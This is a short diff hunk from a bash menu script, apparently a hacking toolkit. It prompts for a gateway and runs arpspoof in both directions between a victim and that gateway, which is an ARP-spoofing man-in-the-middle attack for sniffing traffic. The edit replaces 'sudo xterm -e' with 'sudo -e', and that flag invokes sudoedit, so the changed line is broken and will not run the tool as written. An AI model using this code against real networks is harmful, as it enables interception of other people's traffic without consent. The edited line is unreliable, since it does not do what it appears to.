@@ -146,7 +146,7 @@ do
          read -p 'Default Gateway: ' gate
          echo
          echo "Stop sniffing...U addicted as hell!"
-         sudo xterm -e arpspoof -i $inter -t $vict -r $gate &sudo xterm -e arpspoof -i $inter -t $gate -r $vict 
+         sudo -e arpspoof -i $inter -t $vict -r $gate &sudo -e arpspoof -i $inter -t $gate -r $vict 
          wait
          echo
          backmenu
